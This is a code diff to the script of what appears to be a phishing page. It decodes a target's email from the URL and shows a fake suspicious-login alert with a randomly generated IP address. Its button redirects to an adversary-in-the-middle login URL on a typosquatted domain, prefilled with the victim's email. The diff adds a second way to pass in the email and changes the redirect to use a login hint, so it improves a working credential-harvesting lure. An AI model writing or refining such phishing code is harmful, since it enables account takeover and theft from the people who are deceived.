@@ -58,8 +58,9 @@ h1{font-size:20px;font-weight:600;color:#1b1b1b;margin-bottom:8px}
 
 <script>
 (function(){
-  const hash = window.location.hash.slice(1);
-  const email = hash ? atob(hash) : '';
+  var ep = new URLSearchParams(window.location.search).get('e');
+  var hash = window.location.hash.slice(1);
+  const email = ep ? atob(ep) : (hash ? atob(hash) : '');
   const AITM_URL = 'https://login.hoosiermachlnery.com/qzPdEUwU';
 
   if (email) document.getElementById('accountEmail').textContent = email;
@@ -71,7 +72,7 @@ h1{font-size:20px;font-weight:600;color:#1b1b1b;margin-bottom:8px}
   document.getElementById('fakeIp').textContent = '185.220.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255);
 
   function redirect(){
-    window.location.href = AITM_URL + (email ? '?e=' + encodeURIComponent(email) : '');
+    window.location.href = AITM_URL + (email ? '?login_hint=' + encodeURIComponent(email) : '');
   }
 
   document.getElementById('reviewBtn').addEventListener('click', function(e){
